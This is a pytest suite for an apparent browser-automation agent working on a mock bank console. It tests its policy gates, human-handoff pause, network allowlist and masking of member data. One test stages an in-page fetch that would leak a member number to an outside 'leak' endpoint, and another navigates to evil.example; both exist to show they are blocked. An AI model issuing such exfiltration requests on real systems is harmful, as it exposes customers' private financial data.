"""PlaywrightWebSurface against the live mock bank: targets, act, check per fault, network, masking."""

from __future__ import annotations

import asyncio
import struct
import zlib
from pathlib import Path
from urllib.parse import urlsplit

import pytest

from cua.handoff.controller import NotInControl, SessionControl
from cua.handoff.models import InterventionRequest
from cua.safety.policy import NeedsHuman, PolicyGate, PolicyViolation
from cua.schema.artifact import (
    CapabilityArtifact,
    Check,
    Click,
    Fill,
    Navigate,
    Press,
    RiskClass,
    SelectOption,
)
from cua.session.provider import SessionProvider
from cua.surface.base import ActionFailed
from cua.surface.playwright_web import PlaywrightWebSurface
from cua.surface.wait import poll_until
from mockbank.data import find_member
from tests.conftest import log_events

# ---- helpers ---------------------------------------------------------------------------------- #


async def holds(surface: PlaywrightWebSurface, check: Check, artifact: CapabilityArtifact) -> bool:
    targets = dict(artifact.targets)
    if not all([await surface.check(p, targets) for p in check.all_of]):
        return False
    return not check.any_of or any([await surface.check(p, targets) for p in check.any_of])


async def wait_holds(surface, check: Check, artifact, timeout_ms: int = 8000) -> bool:
    return await poll_until(lambda: holds(surface, check, artifact), timeout_ms, 100)


def step(artifact: CapabilityArtifact, step_id: str):
    return next(s for s in artifact.steps if s.id == step_id)


async def act_step(surface, artifact, step_id: str, value: str | None = None) -> None:
    s = step(artifact, step_id)
    target_id = getattr(s.action, "target", None)
    resolved = await surface.resolve(target_id, artifact.targets[target_id]) if target_id else None
    await surface.act(s.action, resolved, s.risk, value=value)


@pytest.fixture
async def console(session, tenant, make_surface, artifact, mockbank_url):
    """Signed in, console open, nav frame ready. Returns a surface bound to the fixture targets."""
    await SessionProvider(tenant).login(session)
    surface = make_surface()
    await act_step(surface, artifact, "open_lookup", value=f"{mockbank_url}/console")
    return surface


async def set_fault(session, url: str, fault: str) -> None:
    await session.context.add_cookies([{"name": "mb_fault", "value": fault, "url": url}])


async def open_lookup_form(surface, artifact) -> None:
    await act_step(surface, artifact, "go_to_lookup")


async def search(surface, artifact, member_id: str) -> None:
    await open_lookup_form(surface, artifact)
    assert await wait_holds(surface, step(artifact, "go_to_lookup").expect, artifact)
    await act_step(surface, artifact, "enter_member_id", value=member_id)
    await act_step(surface, artifact, "submit_search")


# ---- fixture targets on mockbank -------------------------------------------------------------- #


async def test_fingerprint_holds_after_login(console, artifact):
    assert await wait_holds(console, artifact.app.fingerprint, artifact)


@pytest.mark.parametrize("member_id", ["10001", "10002"])
async def test_lookup_reads_the_savings_row(console, artifact, member_id):
    await search(console, artifact, member_id)
    assert await wait_holds(console, step(artifact, "submit_search").expect, artifact)
    expected = next(a for a in find_member(member_id).accounts if a.account_type == "Share Savings")
    balance = await console.resolve("savings_balance_cell", artifact.targets["savings_balance_cell"])
    status = await console.resolve("savings_status_cell", artifact.targets["savings_status_cell"])
    assert await console.read(balance) == expected.balance
    assert await console.read(status) == expected.status


async def test_member_field_resolves_via_near_text_fallback(console, artifact):
    """The legacy form has no <label for>: `label` misses, `near_text` (index 1) wins."""
    await open_lookup_form(console, artifact)
    assert await wait_holds(console, step(artifact, "go_to_lookup").expect, artifact)
    resolved = await console.resolve("member_id_field", artifact.targets["member_id_field"])
    assert resolved.locator_index == 1
    await console.act(step(artifact, "enter_member_id").action, resolved, RiskClass.reversible, value="10002")
    assert await console.read(resolved) == "10002"


async def test_notice_button_found_in_frame_with_empty_frame_path(console, session, artifact, mockbank_url):
    await set_fault(session, mockbank_url, "notice")
    await open_lookup_form(console, artifact)
    assert await wait_holds(console, artifact.conditions["system_notice"].detect, artifact)
    ok = await console.resolve("notice_ok_button", artifact.targets["notice_ok_button"])
    assert (await ok.handle.owner_frame()).name == "main"


async def test_wrong_frame_path_is_not_found(console, artifact):
    from cua.surface.base import TargetNotFound

    bad = artifact.targets["nav_member_lookup"].model_copy(update={"frame_path": ["nosuchframe"]})
    with pytest.raises(TargetNotFound):
        await console.resolve("nav_member_lookup", bad)


# ---- check(): every fixture condition is detected on its fault --------------------------------- #

CONDITION_CASES = [
    # (fault,            member,  condition,            when)
    ("not_found", "10001", "member_not_found", "search"),
    (None, "10003", "no_savings_account", "search"),
    ("notice", None, "system_notice", "lookup"),
    ("slow", "10001", "still_processing", "search"),
    ("session_expired", None, "session_expired", "lookup"),
    ("denied", "10001", "permission_denied", "search"),
    ("error", "10001", "app_error", "search"),
]


@pytest.mark.parametrize("fault,member,condition,when", CONDITION_CASES, ids=[c[2] for c in CONDITION_CASES])
async def test_condition_detected(console, session, artifact, mockbank_url, fault, member, condition, when):
    if fault:
        await set_fault(session, mockbank_url, fault)
    if when == "lookup":
        await open_lookup_form(console, artifact)
    else:
        await search(console, artifact, member)
    assert await wait_holds(console, artifact.conditions[condition].detect, artifact)
    if condition == "session_expired":
        # /login is inside the `main` frame; the top URL is still /console
        assert urlsplit(session.page.url).path == "/console"


async def test_success_matches_checkpoint_and_no_condition(console, artifact):
    await search(console, artifact, "10001")
    assert await wait_holds(console, step(artifact, "submit_search").expect, artifact)
    assert await holds(console, artifact.success, artifact)
    for cid, cond in artifact.conditions.items():
        assert not await holds(console, cond.detect, artifact), cid


async def test_maint_matches_nothing_known(console, session, artifact, mockbank_url):
    await set_fault(session, mockbank_url, "maint")
    await search(console, artifact, "10001")
    maint = Check.model_validate({"any_of": [{"kind": "text_present", "text": "Maintenance Window"}]})
    assert await wait_holds(console, maint, artifact)
    assert not await holds(console, step(artifact, "submit_search").expect, artifact)
    for cid, cond in artifact.conditions.items():
        assert not await holds(console, cond.detect, artifact), cid


async def test_target_absent_vs_present(console, artifact):
    absent = Check.model_validate({"all_of": [{"kind": "target_absent", "target": "savings_balance_cell"}]})
    await search(console, artifact, "10003")
    assert await wait_holds(console, artifact.conditions["no_savings_account"].detect, artifact)
    assert await holds(console, absent, artifact)
    await search(console, artifact, "10001")
    assert await wait_holds(console, step(artifact, "submit_search").expect, artifact)
    assert not await holds(console, absent, artifact)


async def test_text_present_within_target(console, artifact):
    await search(console, artifact, "10001")
    assert await wait_holds(console, step(artifact, "submit_search").expect, artifact)
    targets = dict(artifact.targets)
    within = {"kind": "text_present", "within": "member_header"}
    assert await console.check(
        Check.model_validate({"all_of": [{**within, "text": "Summary"}]}).all_of[0], targets
    )
    assert not await console.check(
        Check.model_validate({"all_of": [{**within, "text": "Share Savings"}]}).all_of[0], targets
    )


# ---- act(): policy, control hook, value hygiene ----------------------------------------------- #

BUTTON_PAGE = """
<button onclick="window.clicked = true">Post Transfer</button>
<select name="s"><option>One</option><option>Two</option></select>
<input name="k" onkeydown="window.lastKey = event.key">
"""


async def resolve_button(surface):
    from cua.schema.artifact import Target

    t = Target.model_validate(
        {
            "description": "commit",
            "locators": [{"strategy": "role", "role": "button", "name": "Post Transfer"}],
            "rationale": "test",
        }
    )
    return await surface.resolve("commit", t)


async def test_irreversible_click_blocked_in_replay_without_confirm(session, make_surface, run_logger):
    surface = make_surface()
    await session.page.set_content(BUTTON_PAGE)
    with pytest.raises(PolicyViolation):
        await surface.act(
            Click(target="commit"), await resolve_button(surface), RiskClass.irreversible, value=None
        )
    assert await session.page.evaluate("window.clicked") is None
    assert any(e["event"] == "policy_blocked" for e in log_events(run_logger))


async def test_irreversible_click_in_discovery_needs_human(session, make_surface):
    surface = make_surface(mode="discovery")
    await session.page.set_content(BUTTON_PAGE)
    with pytest.raises(NeedsHuman):
        await surface.act(
            Click(target="commit"), await resolve_button(surface), RiskClass.irreversible, value=None
        )
    assert await session.page.evaluate("window.clicked") is None


async def test_disallowed_action_type(session, test_policy, run_logger):
    policy = test_policy.model_copy(update={"allowed_actions": ["navigate", "extract"]})
    surface = PlaywrightWebSurface(session.page, policy, PolicyGate(policy), run_logger, mode="replay")
    await session.page.set_content(BUTTON_PAGE)
    with pytest.raises(PolicyViolation):
        await surface.act(Click(target="commit"), await resolve_button(surface), RiskClass.read, value=None)
    assert await session.page.evaluate("window.clicked") is None


async def test_navigate_outside_allowlist_blocked_before_request(session, make_surface, run_logger):
    surface = make_surface()
    with pytest.raises(PolicyViolation):
        await surface.act(
            Navigate(url="{{tenant.base_url}}/x"), None, RiskClass.read, value="https://evil.example/"
        )
    assert session.page.url == "about:blank"
    assert not any(
        e["event"] == "network_blocked" for e in log_events(run_logger)
    )  # never reached the network


async def test_select_and_press(session, make_surface):
    from cua.schema.artifact import Target

    surface = make_surface()
    await session.page.set_content(BUTTON_PAGE)

    def css(sel: str) -> Target:
        return Target.model_validate(
            {
                "description": sel,
                "locators": [{"strategy": "text", "text": "absent"}, {"strategy": "css", "selector": sel}],
                "rationale": "test",
            }
        )

    sel = await surface.resolve("s", css("select[name=s]"))
    await surface.act(SelectOption(target="s", option="Two"), sel, RiskClass.reversible, value=None)
    assert await surface.read(sel) == "Two"
    key = await surface.resolve("k", css("input[name=k]"))
    await surface.act(Press(target="k", key="Enter"), key, RiskClass.reversible, value=None)
    assert await session.page.evaluate("window.lastKey") == "Enter"


async def test_failed_fill_never_echoes_value(session, make_surface):
    from cua.schema.artifact import Target

    surface = make_surface()
    await session.page.set_content('<input name="m">')
    t = Target.model_validate(
        {
            "description": "m",
            "locators": [{"strategy": "text", "text": "absent"}, {"strategy": "css", "selector": "input"}],
            "rationale": "test",
        }
    )
    resolved = await surface.resolve("m", t)
    await session.page.set_content("<p>gone</p>")  # handle is now detached
    with pytest.raises(ActionFailed) as exc:
        await surface.act(
            Fill(target="m", value="{{inputs.member_id}}"), resolved, RiskClass.reversible, value="77341"
        )
    assert "77341" not in str(exc.value)


def _paused_control() -> tuple[SessionControl, asyncio.Task]:
    from datetime import UTC, datetime

    control = SessionControl("test")
    req = InterventionRequest(
        intervention_id="i1",
        run_id="test",
        mode="replay",
        reason="test",
        current_url="about:blank",
        requested_at=datetime.now(UTC),
    )
    return control, asyncio.create_task(control.request_intervention(req, timeout_s=5))


async def test_act_refused_while_paused(session, make_surface):
    control, waiter = _paused_control()
    await asyncio.sleep(0)  # let the task move the state to PAUSED
    surface = make_surface(control=control)
    await session.page.set_content(BUTTON_PAGE)
    with pytest.raises(NotInControl):
        await surface.act(Click(target="commit"), await resolve_button(surface), RiskClass.read, value=None)
    assert await session.page.evaluate("window.clicked") is None
    control.abort()
    with pytest.raises(Exception):  # noqa: B017 - HandoffAborted, not under test here
        await waiter


# ---- network allowlist ------------------------------------------------------------------------ #


async def test_network_gate_blocks_fetch_and_frames(console, session, run_logger):
    main = session.page.frame(name="main")
    result = await main.evaluate(
        "() => fetch('http://127.0.0.1:1/leak?member=10001').then(() => 'ok', () => 'blocked')"
    )
    assert result == "blocked"
    await main.evaluate(
        "() => { const f = document.createElement('iframe');"
        " f.src = 'http://127.0.0.1:2/x'; document.body.append(f); }"
    )

    async def frame_blocked() -> bool:
        return any(
            e["event"] == "network_blocked" and e["details"]["origin"] == "http://127.0.0.1:2"
            for e in log_events(run_logger)
        )

    assert await poll_until(frame_blocked, 5000, 50)
    blocked = [e for e in log_events(run_logger) if e["event"] == "network_blocked"]
    assert {e["details"]["origin"] for e in blocked} == {"http://127.0.0.1:1", "http://127.0.0.1:2"}
    assert "10001" not in (run_logger.dir / "run.jsonl").read_text()  # origin only, never the query


# ---- snapshot: masked screenshot + redacted DOM ----------------------------------------------- #


def decode_png(data: bytes) -> tuple[int, int, int, bytes]:
    """Minimal PNG decoder (8-bit RGB/RGBA, non-interlaced) → (width, height, bytes_per_pixel, pixels)."""
    assert data[:8] == b"\x89PNG\r\n\x1a\n"
    pos, idat, width = 8, b"", 0
    while pos < len(data):
        (length,) = struct.unpack(">I", data[pos : pos + 4])
        kind, body = data[pos + 4 : pos + 8], data[pos + 8 : pos + 8 + length]
        if kind == b"IHDR":
            width, height, depth, color = struct.unpack(">IIBB", body[:10])
            assert depth == 8 and color in (2, 6)
            bpp = 3 if color == 2 else 4
        elif kind == b"IDAT":
            idat += body
        pos += 12 + length
    raw, stride = zlib.decompress(idat), width * bpp
    out, prev = bytearray(), bytearray(stride)
    for y in range(height):
        f, line = raw[y * (stride + 1)], bytearray(raw[y * (stride + 1) + 1 : (y + 1) * (stride + 1)])
        for i in range(stride):
            a = line[i - bpp] if i >= bpp else 0
            b, c = prev[i], (prev[i - bpp] if i >= bpp else 0)
            if f == 1:
                line[i] = (line[i] + a) & 0xFF
            elif f == 2:
                line[i] = (line[i] + b) & 0xFF
            elif f == 3:
                line[i] = (line[i] + (a + b) // 2) & 0xFF
            elif f == 4:
                p = a + b - c
                pa, pb, pc = abs(p - a), abs(p - b), abs(p - c)
                line[i] = (line[i] + (a if pa <= pb and pa <= pc else b if pb <= pc else c)) & 0xFF
        out += line
        prev = line
    return width, height, bpp, bytes(out)


def region_is_mask_color(png: tuple[int, int, int, bytes], box: dict) -> bool:
    width, _, bpp, px = png
    x0, y0 = int(box["x"]) + 2, int(box["y"]) + 2
    x1, y1 = int(box["x"] + box["width"]) - 2, int(box["y"] + box["height"]) - 2
    assert x1 > x0 and y1 > y0
    for y in range(y0, y1):
        for x in range(x0, x1):
            i = (y * width + x) * bpp
            if tuple(px[i : i + 3]) != (0xFF, 0x00, 0xFF):
                return False
    return True


async def test_member_page_snapshot_has_no_member_name_number_or_balances(
    console, session, artifact, run_logger
):
    member = find_member("10002")
    await search(console, artifact, member.member_id)
    assert await wait_holds(console, step(artifact, "submit_search").expect, artifact)

    files = await console.snapshot("member_summary", dom=True)
    assert files[0].endswith(".png") and not Path(files[0]).is_absolute()

    # Screenshot: member number + name cells (tenant mask_selectors) and the balance (sensitive target)
    # are painted over completely.
    main = session.page.frame(name="main")
    png = decode_png((run_logger.dir / files[0]).read_bytes())
    regions = [main.locator("td.cap + td").nth(0), main.locator("td.cap + td").nth(1)]
    regions.append(main.locator("td.amt").nth(1))  # Share Savings row (second row for 10002)
    regions.append(main.locator("td.amt").nth(0))  # Checking balance: not a target, masked by the digit rule
    for loc in regions:
        assert region_is_mask_color(png, await loc.bounding_box())

    # DOM dumps: no name, no member number, no balances; UI chrome kept.
    dom = "".join((run_logger.dir / f).read_text() for f in files[1:])
    assert "Member Summary" in dom
    assert member.name not in dom
    assert member.member_id not in dom
    for acct in member.accounts:
        assert acct.balance not in dom
        assert acct.balance.lstrip("$") not in dom
    assert "«masked»" in dom and "«digits:sha256:" in dom
    log = (run_logger.dir / "run.jsonl").read_text()
    assert member.name not in log and member.member_id not in log
